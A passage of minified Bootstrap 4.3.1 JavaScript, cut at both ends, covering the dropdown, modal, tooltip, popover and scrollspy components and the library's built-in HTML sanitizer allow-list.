d(n).trigger(e), e.isDefaultPrevented() || (d(this._menu).toggleClass(ht), d(n).toggleClass(ht).trigger(d.Event(It.HIDDEN, t)))) }, ot.dispose = function () { d.removeData(this._element, st), d(this._element).off(rt), this._element = null, (this._menu = null) !== this._popper && (this._popper.destroy(), this._popper = null) }, ot.update = function () { this._inNavbar = this._detectNavbar(), null !== this._popper && this._popper.scheduleUpdate() }, ot._addEventListeners = function () { var e = this; d(this._element).on(It.CLICK, function (t) { t.preventDefault(), t.stopPropagation(), e.toggle() }) }, ot._getConfig = function (t) { return t = s({}, this.constructor.Default, d(this._element).data(), t), C.typeCheckConfig(at, t, this.constructor.DefaultType), t }, ot._getMenuElement = function () { var t; return this._menu || (t = bt._getParentFromElement(this._element)) && (this._menu = t.querySelector(At)), this._menu }, ot._getPlacement = function () { var t = d(this._element.parentNode), e = "bottom-start"; return t.hasClass("dropup") ? (e = "top-start", d(this._menu).hasClass(dt) && (e = "top-end")) : t.hasClass("dropright") ? e = "right-start" : t.hasClass("dropleft") ? e = "left-start" : d(this._menu).hasClass(dt) && (e = "bottom-end"), e }, ot._detectNavbar = function () { return 0 < d(this._element).closest(".navbar").length }, ot._getOffset = function () { var e = this, t = {}; return "function" == typeof this._config.offset ? t.fn = function (t) { return t.offsets = s({}, t.offsets, e._config.offset(t.offsets, e._element) || {}), t } : t.offset = this._config.offset, t }, ot._getPopperConfig = function () { var t = { placement: this._getPlacement(), modifiers: { offset: this._getOffset(), flip: { enabled: this._config.flip }, preventOverflow: { boundariesElement: this._config.boundary } } }; return "static" === this._config.display && (t.modifiers.applyStyle = { enabled: !1 }), t }, bt._jQueryInterface = function (e) { return this.each(function () { var t = d(this).data(st); if (t || (t = new bt(this, "object" == typeof e ? e : null), d(this).data(st, t)), "string" == typeof e) { if (void 0 === t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, bt._clearMenus = function (t) { if (!t || 3 !== t.which && ("keyup" !== t.type || 9 === t.which)) for (var e = [].slice.call(document.querySelectorAll(Ct)), n = 0, i = e.length; n < i; n++) { var o, a, s = bt._getParentFromElement(e[n]), r = d(e[n]).data(st), g = { relatedTarget: e[n] }; t && "click" === t.type && (g.clickEvent = t), r && (o = r._menu, !d(s).hasClass(ht) || t && ("click" === t.type && /input|textarea/i.test(t.target.tagName) || "keyup" === t.type && 9 === t.which) && d.contains(s, t.target) || (a = d.Event(It.HIDE, g), d(s).trigger(a), a.isDefaultPrevented() || ("ontouchstart" in document.documentElement && d(document.body).children().off("mouseover", null, d.noop), e[n].setAttribute("aria-expanded", "false"), d(o).removeClass(ht), d(s).removeClass(ht).trigger(d.Event(It.HIDDEN, g))))) } }, bt._getParentFromElement = function (t) { var e, n = C.getSelectorFromElement(t); return n && (e = document.querySelector(n)), e || t.parentNode }, bt._dataApiKeydownHandler = function (t) { var e, n, i, o, a; (/input|textarea/i.test(t.target.tagName) ? 32 === t.which || 27 !== t.which && (40 !== t.which && 38 !== t.which || d(t.target).closest(At).length) : !ct.test(t.which)) || (t.preventDefault(), t.stopPropagation(), this.disabled || d(this).hasClass(ut)) || (e = bt._getParentFromElement(this), (n = d(e).hasClass(ht)) && (!n || 27 !== t.which && 32 !== t.which) ? 0 !== (i = [].slice.call(e.querySelectorAll(".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)"))).length && (o = i.indexOf(t.target), 38 === t.which && 0 < o && o--, 40 === t.which && o < i.length - 1 && o++, o < 0 && (o = 0), i[o].focus()) : (27 === t.which && (a = e.querySelector(Ct), d(a).trigger("focus")), d(this).trigger("click"))) }, a(bt, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return pt } }, { key: "DefaultType", get: function () { return mt } }]), bt); function bt(t, e) { this._element = t, this._popper = null, this._config = this._getConfig(e), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners() } d(document).on(It.KEYDOWN_DATA_API, Ct, ft._dataApiKeydownHandler).on(It.KEYDOWN_DATA_API, At, ft._dataApiKeydownHandler).on(It.CLICK_DATA_API + " " + It.KEYUP_DATA_API, ft._clearMenus).on(It.CLICK_DATA_API, Ct, function (t) { t.preventDefault(), t.stopPropagation(), ft._jQueryInterface.call(d(this), "toggle") }).on(It.CLICK_DATA_API, ".dropdown form", function (t) { t.stopPropagation() }), d.fn[at] = ft._jQueryInterface, d.fn[at].Constructor = ft, d.fn[at].noConflict = function () { return d.fn[at] = lt, ft._jQueryInterface }; var Bt, yt = "modal", vt = "bs.modal", xt = "." + vt, Ft = d.fn[yt], Qt = { backdrop: !0, keyboard: !0, focus: !0, show: !0 }, Gt = { backdrop: "(boolean|string)", keyboard: "boolean", focus: "boolean", show: "boolean" }, wt = { HIDE: "hide" + xt, HIDDEN: "hidden" + xt, SHOW: "show" + xt, SHOWN: "shown" + xt, FOCUSIN: "focusin" + xt, RESIZE: "resize" + xt, CLICK_DISMISS: "click.dismiss" + xt, KEYDOWN_DISMISS: "keydown.dismiss" + xt, MOUSEUP_DISMISS: "mouseup.dismiss" + xt, MOUSEDOWN_DISMISS: "mousedown.dismiss" + xt, CLICK_DATA_API: "click" + xt + ".data-api" }, Xt = "modal-open", St = "fade", kt = "show", Dt = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", Zt = ".sticky-top", Ut = ((Bt = Wt.prototype).toggle = function (t) { return this._isShown ? this.hide() : this.show(t) }, Bt.show = function (t) { var e, n = this; this._isShown || this._isTransitioning || (d(this._element).hasClass(St) && (this._isTransitioning = !0), e = d.Event(wt.SHOW, { relatedTarget: t }), d(this._element).trigger(e), this._isShown || e.isDefaultPrevented() || (this._isShown = !0, this._checkScrollbar(), this._setScrollbar(), this._adjustDialog(), this._setEscapeEvent(), this._setResizeEvent(), d(this._element).on(wt.CLICK_DISMISS, '[data-dismiss="modal"]', function (t) { return n.hide(t) }), d(this._dialog).on(wt.MOUSEDOWN_DISMISS, function () { d(n._element).one(wt.MOUSEUP_DISMISS, function (t) { d(t.target).is(n._element) && (n._ignoreBackdropClick = !0) }) }), this._showBackdrop(function () { return n._showElement(t) }))) }, Bt.hide = function (t) { var e, n, i, o = this; t && t.preventDefault(), this._isShown && !this._isTransitioning && (e = d.Event(wt.HIDE), d(this._element).trigger(e), this._isShown && !e.isDefaultPrevented() && (this._isShown = !1, (n = d(this._element).hasClass(St)) && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), d(document).off(wt.FOCUSIN), d(this._element).removeClass(kt), d(this._element).off(wt.CLICK_DISMISS), d(this._dialog).off(wt.MOUSEDOWN_DISMISS), n ? (i = C.getTransitionDurationFromElement(this._element), d(this._element).one(C.TRANSITION_END, function (t) { return o._hideModal(t) }).emulateTransitionEnd(i)) : this._hideModal())) }, Bt.dispose = function () { [window, this._element, this._dialog].forEach(function (t) { return d(t).off(xt) }), d(document).off(wt.FOCUSIN), d.removeData(this._element, vt), this._config = null, this._element = null, this._dialog = null, this._backdrop = null, this._isShown = null, this._isBodyOverflowing = null, this._ignoreBackdropClick = null, this._isTransitioning = null, this._scrollbarWidth = null }, Bt.handleUpdate = function () { this._adjustDialog() }, Bt._getConfig = function (t) { return t = s({}, Qt, t), C.typeCheckConfig(yt, t, Gt), t }, Bt._showElement = function (t) { var e = this, n = d(this._element).hasClass(St); function i() { e._config.focus && e._element.focus(), e._isTransitioning = !1, d(e._element).trigger(a) } this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.setAttribute("aria-modal", !0), d(this._dialog).hasClass("modal-dialog-scrollable") ? this._dialog.querySelector(".modal-body").scrollTop = 0 : this._element.scrollTop = 0, n && C.reflow(this._element), d(this._element).addClass(kt), this._config.focus && this._enforceFocus(); var o, a = d.Event(wt.SHOWN, { relatedTarget: t }); n ? (o = C.getTransitionDurationFromElement(this._dialog), d(this._dialog).one(C.TRANSITION_END, i).emulateTransitionEnd(o)) : i() }, Bt._enforceFocus = function () { var e = this; d(document).off(wt.FOCUSIN).on(wt.FOCUSIN, function (t) { document !== t.target && e._element !== t.target && 0 === d(e._element).has(t.target).length && e._element.focus() }) }, Bt._setEscapeEvent = function () { var e = this; this._isShown && this._config.keyboard ? d(this._element).on(wt.KEYDOWN_DISMISS, function (t) { 27 === t.which && (t.preventDefault(), e.hide()) }) : this._isShown || d(this._element).off(wt.KEYDOWN_DISMISS) }, Bt._setResizeEvent = function () { var e = this; this._isShown ? d(window).on(wt.RESIZE, function (t) { return e.handleUpdate(t) }) : d(window).off(wt.RESIZE) }, Bt._hideModal = function () { var t = this; this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._element.removeAttribute("aria-modal"), this._isTransitioning = !1, this._showBackdrop(function () { d(document.body).removeClass(Xt), t._resetAdjustments(), t._resetScrollbar(), d(t._element).trigger(wt.HIDDEN) }) }, Bt._removeBackdrop = function () { this._backdrop && (d(this._backdrop).remove(), this._backdrop = null) }, Bt._showBackdrop = function (t) { var e, n, i = this, o = d(this._element).hasClass(St) ? St : ""; if (this._isShown && this._config.backdrop) { if (this._backdrop = document.createElement("div"), this._backdrop.className = "modal-backdrop", o && this._backdrop.classList.add(o), d(this._backdrop).appendTo(document.body), d(this._element).on(wt.CLICK_DISMISS, function (t) { i._ignoreBackdropClick ? i._ignoreBackdropClick = !1 : t.target === t.currentTarget && ("static" === i._config.backdrop ? i._element.focus() : i.hide()) }), o && C.reflow(this._backdrop), d(this._backdrop).addClass(kt), !t) return; if (!o) return void t(); var a = C.getTransitionDurationFromElement(this._backdrop); d(this._backdrop).one(C.TRANSITION_END, t).emulateTransitionEnd(a) } else !this._isShown && this._backdrop ? (d(this._backdrop).removeClass(kt), e = function () { i._removeBackdrop(), t && t() }, d(this._element).hasClass(St) ? (n = C.getTransitionDurationFromElement(this._backdrop), d(this._backdrop).one(C.TRANSITION_END, e).emulateTransitionEnd(n)) : e()) : t && t() }, Bt._adjustDialog = function () { var t = this._element.scrollHeight > document.documentElement.clientHeight; !this._isBodyOverflowing && t && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !t && (this._element.style.paddingRight = this._scrollbarWidth + "px") }, Bt._resetAdjustments = function () { this._element.style.paddingLeft = "", this._element.style.paddingRight = "" }, Bt._checkScrollbar = function () { var t = document.body.getBoundingClientRect(); this._isBodyOverflowing = t.left + t.right < window.innerWidth, this._scrollbarWidth = this._getScrollbarWidth() }, Bt._setScrollbar = function () { var t, e, n, i, o = this; this._isBodyOverflowing && (t = [].slice.call(document.querySelectorAll(Dt)), e = [].slice.call(document.querySelectorAll(Zt)), d(t).each(function (t, e) { var n = e.style.paddingRight, i = d(e).css("padding-right"); d(e).data("padding-right", n).css("padding-right", parseFloat(i) + o._scrollbarWidth + "px") }), d(e).each(function (t, e) { var n = e.style.marginRight, i = d(e).css("margin-right"); d(e).data("margin-right", n).css("margin-right", parseFloat(i) - o._scrollbarWidth + "px") }), n = document.body.style.paddingRight, i = d(document.body).css("padding-right"), d(document.body).data("padding-right", n).css("padding-right", parseFloat(i) + this._scrollbarWidth + "px")), d(document.body).addClass(Xt) }, Bt._resetScrollbar = function () { var t = [].slice.call(document.querySelectorAll(Dt)); d(t).each(function (t, e) { var n = d(e).data("padding-right"); d(e).removeData("padding-right"), e.style.paddingRight = n || "" }); var e = [].slice.call(document.querySelectorAll(Zt)); d(e).each(function (t, e) { var n = d(e).data("margin-right"); void 0 !== n && d(e).css("margin-right", n).removeData("margin-right") }); var n = d(document.body).data("padding-right"); d(document.body).removeData("padding-right"), document.body.style.paddingRight = n || "" }, Bt._getScrollbarWidth = function () { var t = document.createElement("div"); t.className = "modal-scrollbar-measure", document.body.appendChild(t); var e = t.getBoundingClientRect().width - t.clientWidth; return document.body.removeChild(t), e }, Wt._jQueryInterface = function (n, i) { return this.each(function () { var t = d(this).data(vt), e = s({}, Qt, d(this).data(), "object" == typeof n && n ? n : {}); if (t || (t = new Wt(this, e), d(this).data(vt, t)), "string" == typeof n) { if (void 0 === t[n]) throw new TypeError('No method named "' + n + '"'); t[n](i) } else e.show && t.show(i) }) }, a(Wt, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return Qt } }]), Wt); function Wt(t, e) { this._config = this._getConfig(e), this._element = t, this._dialog = t.querySelector(".modal-dialog"), this._backdrop = null, this._isShown = !1, this._isBodyOverflowing = !1, this._ignoreBackdropClick = !1, this._isTransitioning = !1, this._scrollbarWidth = 0 } d(document).on(wt.CLICK_DATA_API, '[data-toggle="modal"]', function (t) { var e, n = this, i = C.getSelectorFromElement(this); i && (e = document.querySelector(i)); var o = d(e).data(vt) ? "toggle" : s({}, d(e).data(), d(this).data()); "A" !== this.tagName && "AREA" !== this.tagName || t.preventDefault(); var a = d(e).one(wt.SHOW, function (t) { t.isDefaultPrevented() || a.one(wt.HIDDEN, function () { d(n).is(":visible") && n.focus() }) }); Ut._jQueryInterface.call(d(e), o, this) }), d.fn[yt] = Ut._jQueryInterface, d.fn[yt].Constructor = Ut, d.fn[yt].noConflict = function () { return d.fn[yt] = Ft, Ut._jQueryInterface }; var Nt = ["background", "cite", "href", "itemtype", "longdesc", "poster", "src", "xlink:href"], Tt = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi, Ht = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i; function Et(t, a, e) { if (0 === t.length) return t; if (e && "function" == typeof e) return e(t); for (var n = (new window.DOMParser).parseFromString(t, "text/html"), s = Object.keys(a), r = [].slice.call(n.body.querySelectorAll("*")), i = 0, o = r.length; i < o; i++)!function (t) { var e = r[t], n = e.nodeName.toLowerCase(); if (-1 === s.indexOf(e.nodeName.toLowerCase())) return e.parentNode.removeChild(e); var i = [].slice.call(e.attributes), o = [].concat(a["*"] || [], a[n] || []); i.forEach(function (t) { !function (t, e) { var n = t.nodeName.toLowerCase(); if (-1 !== e.indexOf(n)) return -1 === Nt.indexOf(n) || Boolean(t.nodeValue.match(Tt) || t.nodeValue.match(Ht)); for (var i = e.filter(function (t) { return t instanceof RegExp }), o = 0, a = i.length; o < a; o++)if (n.match(i[o])) return 1 }(t, o) && e.removeAttribute(t.nodeName) }) }(i); return n.body.innerHTML } var Rt, Yt = "tooltip", Ot = "bs.tooltip", _t = "." + Ot, Vt = d.fn[Yt], Lt = "bs-tooltip", Mt = new RegExp("(^|\\s)" + Lt + "\\S+", "g"), zt = ["sanitize", "whiteList", "sanitizeFn"], Pt = { animation: "boolean", template: "string", title: "(string|element|function)", trigger: "string", delay: "(number|object)", html: "boolean", selector: "(string|boolean)", placement: "(string|function)", offset: "(number|string|function)", container: "(string|element|boolean)", fallbackPlacement: "(string|array)", boundary: "(string|element)", sanitize: "boolean", sanitizeFn: "(null|function)", whiteList: "object" }, Kt = { AUTO: "auto", TOP: "top", RIGHT: "right", BOTTOM: "bottom", LEFT: "left" }, Jt = { animation: !0, template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>', trigger: "hover focus", title: "", delay: 0, html: !1, selector: !1, placement: "top", offset: 0, container: !1, fallbackPlacement: "flip", boundary: "scrollParent", sanitize: !0, sanitizeFn: null, whiteList: { "*": ["class", "dir", "id", "lang", "role", /^aria-[\w-]*$/i], a: ["target", "href", "title", "rel"], area: [], b: [], br: [], col: [], code: [], div: [], em: [], hr: [], h1: [], h2: [], h3: [], h4: [], h5: [], h6: [], i: [], img: ["src", "alt", "title", "width", "height"], li: [], ol: [], p: [], pre: [], s: [], small: [], span: [], sub: [], sup: [], strong: [], u: [], ul: [] } }, jt = "show", $t = { HIDE: "hide" + _t, HIDDEN: "hidden" + _t, SHOW: "show" + _t, SHOWN: "shown" + _t, INSERTED: "inserted" + _t, CLICK: "click" + _t, FOCUSIN: "focusin" + _t, FOCUSOUT: "focusout" + _t, MOUSEENTER: "mouseenter" + _t, MOUSELEAVE: "mouseleave" + _t }, qt = "fade", te = "show", ee = "hover", ne = "focus", ie = ((Rt = oe.prototype).enable = function () { this._isEnabled = !0 }, Rt.disable = function () { this._isEnabled = !1 }, Rt.toggleEnabled = function () { this._isEnabled = !this._isEnabled }, Rt.toggle = function (t) { if (this._isEnabled) if (t) { var e = this.constructor.DATA_KEY, n = d(t.currentTarget).data(e); n || (n = new this.constructor(t.currentTarget, this._getDelegateConfig()), d(t.currentTarget).data(e, n)), n._activeTrigger.click = !n._activeTrigger.click, n._isWithActiveTrigger() ? n._enter(null, n) : n._leave(null, n) } else { if (d(this.getTipElement()).hasClass(te)) return void this._leave(null, this); this._enter(null, this) } }, Rt.dispose = function () { clearTimeout(this._timeout), d.removeData(this.element, this.constructor.DATA_KEY), d(this.element).off(this.constructor.EVENT_KEY), d(this.element).closest(".modal").off("hide.bs.modal"), this.tip && d(this.tip).remove(), this._isEnabled = null, this._timeout = null, this._hoverState = null, (this._activeTrigger = null) !== this._popper && this._popper.destroy(), this._popper = null, this.element = null, this.config = null, this.tip = null }, Rt.show = function () { var e = this; if ("none" === d(this.element).css("display")) throw new Error("Please use show on visible elements"); var t = d.Event(this.constructor.Event.SHOW); if (this.isWithContent() && this._isEnabled) { d(this.element).trigger(t); var n = C.findShadowRoot(this.element), i = d.contains(null !== n ? n : this.element.ownerDocument.documentElement, this.element); if (t.isDefaultPrevented() || !i) return; var o = this.getTipElement(), a = C.getUID(this.constructor.NAME); o.setAttribute("id", a), this.element.setAttribute("aria-describedby", a), this.setContent(), this.config.animation && d(o).addClass(qt); var s = "function" == typeof this.config.placement ? this.config.placement.call(this, o, this.element) : this.config.placement, r = this._getAttachment(s); this.addAttachmentClass(r); var g = this._getContainer(); d(o).data(this.constructor.DATA_KEY, this), d.contains(this.element.ownerDocument.documentElement, this.tip) || d(o).appendTo(g), d(this.element).trigger(this.constructor.Event.INSERTED), this._popper = new I(this.element, o, { placement: r, modifiers: { offset: this._getOffset(), flip: { behavior: this.config.fallbackPlacement }, arrow: { element: ".arrow" }, preventOverflow: { boundariesElement: this.config.boundary } }, onCreate: function (t) { t.originalPlacement !== t.placement && e._handlePopperPlacementChange(t) }, onUpdate: function (t) { return e._handlePopperPlacementChange(t) } }), d(o).addClass(te), "ontouchstart" in document.documentElement && d(document.body).children().on("mouseover", null, d.noop); var l, c = function () { e.config.animation && e._fixTransition(); var t = e._hoverState; e._hoverState = null, d(e.element).trigger(e.constructor.Event.SHOWN), "out" === t && e._leave(null, e) }; d(this.tip).hasClass(qt) ? (l = C.getTransitionDurationFromElement(this.tip), d(this.tip).one(C.TRANSITION_END, c).emulateTransitionEnd(l)) : c() } }, Rt.hide = function (t) { function e() { i._hoverState !== jt && o.parentNode && o.parentNode.removeChild(o), i._cleanTipClass(), i.element.removeAttribute("aria-describedby"), d(i.element).trigger(i.constructor.Event.HIDDEN), null !== i._popper && i._popper.destroy(), t && t() } var n, i = this, o = this.getTipElement(), a = d.Event(this.constructor.Event.HIDE); d(this.element).trigger(a), a.isDefaultPrevented() || (d(o).removeClass(te), "ontouchstart" in document.documentElement && d(document.body).children().off("mouseover", null, d.noop), this._activeTrigger.click = !1, this._activeTrigger[ne] = !1, this._activeTrigger[ee] = !1, d(this.tip).hasClass(qt) ? (n = C.getTransitionDurationFromElement(o), d(o).one(C.TRANSITION_END, e).emulateTransitionEnd(n)) : e(), this._hoverState = "") }, Rt.update = function () { null !== this._popper && this._popper.scheduleUpdate() }, Rt.isWithContent = function () { return Boolean(this.getTitle()) }, Rt.addAttachmentClass = function (t) { d(this.getTipElement()).addClass(Lt + "-" + t) }, Rt.getTipElement = function () { return this.tip = this.tip || d(this.config.template)[0], this.tip }, Rt.setContent = function () { var t = this.getTipElement(); this.setElementContent(d(t.querySelectorAll(".tooltip-inner")), this.getTitle()), d(t).removeClass(qt + " " + te) }, Rt.setElementContent = function (t, e) { "object" != typeof e || !e.nodeType && !e.jquery ? this.config.html ? (this.config.sanitize && (e = Et(e, this.config.whiteList, this.config.sanitizeFn)), t.html(e)) : t.text(e) : this.config.html ? d(e).parent().is(t) || t.empty().append(e) : t.text(d(e).text()) }, Rt.getTitle = function () { return this.element.getAttribute("data-original-title") || ("function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title) }, Rt._getOffset = function () { var e = this, t = {}; return "function" == typeof this.config.offset ? t.fn = function (t) { return t.offsets = s({}, t.offsets, e.config.offset(t.offsets, e.element) || {}), t } : t.offset = this.config.offset, t }, Rt._getContainer = function () { return !1 === this.config.container ? document.body : C.isElement(this.config.container) ? d(this.config.container) : d(document).find(this.config.container) }, Rt._getAttachment = function (t) { return Kt[t.toUpperCase()] }, Rt._setListeners = function () { var i = this; this.config.trigger.split(" ").forEach(function (t) { var e, n; "click" === t ? d(i.element).on(i.constructor.Event.CLICK, i.config.selector, function (t) { return i.toggle(t) }) : "manual" !== t && (e = t === ee ? i.constructor.Event.MOUSEENTER : i.constructor.Event.FOCUSIN, n = t === ee ? i.constructor.Event.MOUSELEAVE : i.constructor.Event.FOCUSOUT, d(i.element).on(e, i.config.selector, function (t) { return i._enter(t) }).on(n, i.config.selector, function (t) { return i._leave(t) })) }), d(this.element).closest(".modal").on("hide.bs.modal", function () { i.element && i.hide() }), this.config.selector ? this.config = s({}, this.config, { trigger: "manual", selector: "" }) : this._fixTitle() }, Rt._fixTitle = function () { var t = typeof this.element.getAttribute("data-original-title"); !this.element.getAttribute("title") && "string" == t || (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", "")) }, Rt._enter = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || d(t.currentTarget).data(n)) || (e = new this.constructor(t.currentTarget, this._getDelegateConfig()), d(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusin" === t.type ? ne : ee] = !0), d(e.getTipElement()).hasClass(te) || e._hoverState === jt ? e._hoverState = jt : (clearTimeout(e._timeout), e._hoverState = jt, e.config.delay && e.config.delay.show ? e._timeout = setTimeout(function () { e._hoverState === jt && e.show() }, e.config.delay.show) : e.show()) }, Rt._leave = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || d(t.currentTarget).data(n)) || (e = new this.constructor(t.currentTarget, this._getDelegateConfig()), d(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusout" === t.type ? ne : ee] = !1), e._isWithActiveTrigger() || (clearTimeout(e._timeout), e._hoverState = "out", e.config.delay && e.config.delay.hide ? e._timeout = setTimeout(function () { "out" === e._hoverState && e.hide() }, e.config.delay.hide) : e.hide()) }, Rt._isWithActiveTrigger = function () { for (var t in this._activeTrigger) if (this._activeTrigger[t]) return !0; return !1 }, Rt._getConfig = function (t) { var e = d(this.element).data(); return Object.keys(e).forEach(function (t) { -1 !== zt.indexOf(t) && delete e[t] }), "number" == typeof (t = s({}, this.constructor.Default, e, "object" == typeof t && t ? t : {})).delay && (t.delay = { show: t.delay, hide: t.delay }), "number" == typeof t.title && (t.title = t.title.toString()), "number" == typeof t.content && (t.content = t.content.toString()), C.typeCheckConfig(Yt, t, this.constructor.DefaultType), t.sanitize && (t.template = Et(t.template, t.whiteList, t.sanitizeFn)), t }, Rt._getDelegateConfig = function () { var t = {}; if (this.config) for (var e in this.config) this.constructor.Default[e] !== this.config[e] && (t[e] = this.config[e]); return t }, Rt._cleanTipClass = function () { var t = d(this.getTipElement()), e = t.attr("class").match(Mt); null !== e && e.length && t.removeClass(e.join("")) }, Rt._handlePopperPlacementChange = function (t) { var e = t.instance; this.tip = e.popper, this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(t.placement)) }, Rt._fixTransition = function () { var t = this.getTipElement(), e = this.config.animation; null === t.getAttribute("x-placement") && (d(t).removeClass(qt), this.config.animation = !1, this.hide(), this.show(), this.config.animation = e) }, oe._jQueryInterface = function (n) { return this.each(function () { var t = d(this).data(Ot), e = "object" == typeof n && n; if ((t || !/dispose|hide/.test(n)) && (t || (t = new oe(this, e), d(this).data(Ot, t)), "string" == typeof n)) { if (void 0 === t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, a(oe, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return Jt } }, { key: "NAME", get: function () { return Yt } }, { key: "DATA_KEY", get: function () { return Ot } }, { key: "Event", get: function () { return $t } }, { key: "EVENT_KEY", get: function () { return _t } }, { key: "DefaultType", get: function () { return Pt } }]), oe); function oe(t, e) { if (void 0 === I) throw new TypeError("Bootstrap's tooltips require Popper.js (https://popper.js.org/)"); this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this.element = t, this.config = this._getConfig(e), this.tip = null, this._setListeners() } d.fn[Yt] = ie._jQueryInterface, d.fn[Yt].Constructor = ie, d.fn[Yt].noConflict = function () { return d.fn[Yt] = Vt, ie._jQueryInterface }; var ae = "popover", se = "bs.popover", re = "." + se, ge = d.fn[ae], le = "bs-popover", ce = new RegExp("(^|\\s)" + le + "\\S+", "g"), Ie = s({}, ie.Default, { placement: "right", trigger: "click", content: "", template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>' }), ue = s({}, ie.DefaultType, { content: "(string|element|function)" }), he = { HIDE: "hide" + re, HIDDEN: "hidden" + re, SHOW: "show" + re, SHOWN: "shown" + re, INSERTED: "inserted" + re, CLICK: "click" + re, FOCUSIN: "focusin" + re, FOCUSOUT: "focusout" + re, MOUSEENTER: "mouseenter" + re, MOUSELEAVE: "mouseleave" + re }, de = function (t) { var e, n; function i() { return t.apply(this, arguments) || this } n = t, (e = i).prototype = Object.create(n.prototype), (e.prototype.constructor = e).__proto__ = n; var o = i.prototype; return o.isWithContent = function () { return this.getTitle() || this._getContent() }, o.addAttachmentClass = function (t) { d(this.getTipElement()).addClass(le + "-" + t) }, o.getTipElement = function () { return this.tip = this.tip || d(this.config.template)[0], this.tip }, o.setContent = function () { var t = d(this.getTipElement()); this.setElementContent(t.find(".popover-header"), this.getTitle()); var e = this._getContent(); "function" == typeof e && (e = e.call(this.element)), this.setElementContent(t.find(".popover-body"), e), t.removeClass("fade show") }, o._getContent = function () { return this.element.getAttribute("data-content") || this.config.content }, o._cleanTipClass = function () { var t = d(this.getTipElement()), e = t.attr("class").match(ce); null !== e && 0 < e.length && t.removeClass(e.join("")) }, i._jQueryInterface = function (n) { return this.each(function () { var t = d(this).data(se), e = "object" == typeof n ? n : null; if ((t || !/dispose|hide/.test(n)) && (t || (t = new i(this, e), d(this).data(se, t)), "string" == typeof n)) { if (void 0 === t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, a(i, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return Ie } }, { key: "NAME", get: function () { return ae } }, { key: "DATA_KEY", get: function () { return se } }, { key: "Event", get: function () { return he } }, { key: "EVENT_KEY", get: function () { return re } }, { key: "DefaultType", get: function () { return ue } }]), i }(ie); d.fn[ae] = de._jQueryInterface, d.fn[ae].Constructor = de, d.fn[ae].noConflict = function () { return d.fn[ae] = ge, de._jQueryInterface }; var Ce, Ae = "scrollspy", pe = "bs.scrollspy", me = "." + pe, fe = d.fn[Ae], be = { offset: 10, method: "auto", target: "" }, Be = { offset: "number", method: "string", target: "(string|element)" }, ye = { ACTIVATE: "activate" + me, SCROLL: "scroll" + me, LOAD_DATA_API: "load" + me + ".data-api" }, ve = "active", xe = ".nav, .list-group", Fe = ".nav-link", Qe = ".list-group-item", Ge = "position", we = ((Ce = Xe.prototype).refresh = function () { var e = this, t = this._scrollElement === this._scrollElement.window ? "offset" : Ge, o = "auto" === this._config.method ? t : this._config.method, a = o === Ge ? this._getScrollTop() : 0; this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), [].slice.call(document.querySelectorAll(this._selector)).map(function (t) { var e, n = C.getSelectorFromElement(t); if (n && (e = document.querySelector(n)), e) { var i = e.getBoundingClientRect(); if (i.width || i.height) return [d(e)[o]().top + a, n] } return null }).filter(function (t) { return t }).sort(function (t, e) { return t[0] - e[0] }).forEach(function (t) { e._offsets.push(t[0]), e._targets.push(t[1]) }) }, Ce.dispose = function () { d.removeData(this._element, pe), d(this._scrollElement).off(me), this._element = null, this._scrollElement = null, this._config = null, this._selector = null, this._offsets = null, this._targets = null, this._activeTarget = null, this._scrollHeight = null }, Ce._getConfig = function (t) { var e; return "string" != typeof (t = s({}, be, "object" == typeof t && t ? t : {})).target && ((e = d(t.target).attr("id")) || (e = C.getUID(Ae), d(t.target).attr("id", e)), t.target = "#" + e), C.typeCheckConfig(Ae, t, Be), t }, Ce._getScrollTop = function () { return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop }, Ce._getScrollHeight = function () { return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight) }, Ce._getOffsetHeight = function () { return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height }, Ce._process = function () { var t = this._getScrollTop() + this._config.offset, e = this._getScrollHeight(), n = this._config.offset + e - this._getOffsetHeight(); if (this._scrollHeight !== e && this.refresh(), n <= t) { var i = this._targets[this._targets.length - 1]; this._activeTarget !== i && this._activate(i) } else { if (this._activeTarget && t < this._offsets[0] && 0 < this._offsets[0]) return this._activeTarget = null, void this._clear(); for (var o = this._offsets.length; o--;)this._activeTarget !== this._targets[o] && t >= this._offsets[o] && (void 0 === this._offsets[o + 1] || t < this._offsets[o + 1]) && this._activate(this._targets[o]) } }, Ce._activate = function (e) { this._activeTarget = e, this._clear(); var t = this._selector.split(",").map(function (t) { 